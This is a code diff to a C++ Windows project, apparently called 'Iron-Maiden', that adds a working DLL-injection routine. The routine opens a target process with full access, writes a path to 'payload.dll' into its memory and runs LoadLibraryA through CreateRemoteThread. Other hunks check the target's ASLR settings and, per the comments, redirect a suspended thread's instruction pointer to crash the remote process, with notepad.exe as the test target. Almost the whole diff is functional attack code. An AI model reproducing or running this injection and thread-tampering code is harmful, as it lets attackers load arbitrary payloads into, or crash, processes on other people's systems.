@@ -35,9 +35,8 @@ bool ProtCheck(DWORD ProcId)
 	}
 	std::cout << "[+] Address Space Layout Randomization: " << aslr.EnableBottomUpRandomization << "\n";
 	std::cout << "[+] Address Space Layout Randomization: " << aslr.EnableForceRelocateImages << "\n";
-	return true;
 	CloseHandle(hwld);
-	// if there are minimal protections set then return a certain value else return something else
+	return true;
 }
 
 int ProcIDs()
@@ -121,6 +120,50 @@ int GetThreadID(int PID)
 	return -1;
 }
 
+
+bool ExceptionInjector(int pid) // DLL injection stuff might change this to a better injection technique
+{
+	const char* dllpath = "C:\\Users\\Owner\\Desktop\\Projects\\Iron-Maiden\\payload.dll";
+	size_t pathsize = strlen(dllpath) + 1;
+	
+	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+	if(proc == NULL)
+	{
+		std::cout << "[-] Could not obtain handle for " << pid << "!\n";
+		return 0;
+	}
+	LPVOID allocation = VirtualAllocEx(proc, NULL, pathsize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE); // PAGE_EXECUTE_READWRITE
+	if(allocation == NULL)
+	{
+		std::cout << "[-] Failed to allocate memory!\n";
+		CloseHandle(proc);
+		return 0;
+	}
+	if(!WriteProcessMemory(proc, allocation, dllpath, pathsize, NULL))
+	{
+		std::cout << "[-] Failed to write dll to memory!\n";
+		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
+		CloseHandle(proc);
+		return 0;
+	}
+	HANDLE tread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"), allocation, 0, NULL);
+	if(tread == NULL)
+	{
+		std::cout << "[-] Failed to execute DLL in remote process!\n";
+		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
+		CloseHandle(proc);
+		return 0;
+	}
+	WaitForSingleObject(tread, INFINITE);
+	
+	VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
+	CloseHandle(tread);
+	CloseHandle(proc);
+	
+	std::cout << "[+] Successfully injected & executed DLL with some cleaning up!";
+	return 1;
+}
+
 int main()
 {
 	CONTEXT ctx;
@@ -140,6 +183,12 @@ int main()
 		std::cout << "[-] notepad.exe is not running";	//		debugging purposes so in the final build please
 		exit(-1);										//		remove this segment and refactor the code in case
 	}													// End of the test code segment
+	
+	if(!ExceptionInjector(pid))
+	{
+		std::cout << "[-] Failed to inject DLL!";
+		exit(-1);
+	}
 	
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
 	if(!hProcess)
@@ -175,7 +224,7 @@ int main()
 	// instruction pointer to invalid address
 	
 	ResumeThread(hThread);
-	std::cout << "[!] Check if notepad.exe crashed";
-	//CloseHandle(hProcess);
-	//CloseHandle(hThread);
+	std::cout << "[!] Check if remote process crashed";
+	CloseHandle(hProcess);
+	CloseHandle(hThread);
 }
